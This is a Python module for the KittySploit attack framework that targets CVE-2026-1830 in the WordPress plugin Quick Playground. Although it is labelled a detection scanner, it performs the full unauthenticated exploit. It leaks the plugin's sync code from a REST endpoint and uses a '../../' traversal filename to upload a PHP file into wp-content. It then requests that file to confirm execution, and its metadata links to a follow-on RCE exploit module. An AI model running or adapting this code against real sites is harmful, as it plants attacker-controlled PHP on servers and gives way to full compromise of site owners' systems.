#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Quick Playground <= 1.3.1 blueprint leak + upload RCE (CVE-2026-1830)."""

import base64
import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "quick-playground"
_VULN_HIGH = (1, 3, 1)
_MARKER = "CVE-2026-1830"


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Quick Playground CVE-2026-1830 RCE detect",
        "description": (
            "Detects CVE-2026-1830: leaks qckply_sync_code from blueprint REST, uploads PHP via upload_image."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-1830",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-1830"],
        "modules": ["exploits/multi/http/quick_playground_cve_2026_1830_rce"],
        "tags": ["web", "scanner", "wordpress", "quick-playground", "rce", "cve-2026-1830"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["exploits/multi/http/quick_playground_cve_2026_1830_rce"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        bp = self.http_request(
            method="GET",
            path=self._join("/wp-json/quickplayground/v1/blueprint/default"),
            allow_redirects=False,
        )
        if not bp or bp.status_code != 200:
            return False
        m = re.search(r'"qckply_sync_code"\s*:\s*"([a-zA-Z0-9]+)"', bp.text or "")
        if not m:
            return False
        fname = f"ks{secrets.token_hex(4)}.php"
        php = f'<?php echo "{_MARKER}"; ?>'
        payload = json.dumps(
            {
                "sync_code": m.group(1),
                "base64": base64.b64encode(php.encode()).decode(),
                "filename": f"../../{fname}",
            }
        )
        up = self.http_request(
            method="POST",
            path=self._join("/wp-json/quickplayground/v1/upload_image/default"),
            headers={"Content-Type": "application/json"},
            data=payload,
            allow_redirects=False,
        )
        if not up or "saving to" not in (up.text or "").lower():
            return False
        check = self.http_request(method="GET", path=self._join(f"/wp-content/{fname}"), allow_redirects=False)
        if check and check.status_code == 200 and _MARKER in (check.text or ""):
            self.set_info(
                severity="critical",
                reason="Quick Playground CVE-2026-1830 — unauth PHP upload",
                path="/wp-json/quickplayground/v1/upload_image/default",
                cve="CVE-2026-1830",
            )
            return True
        return False
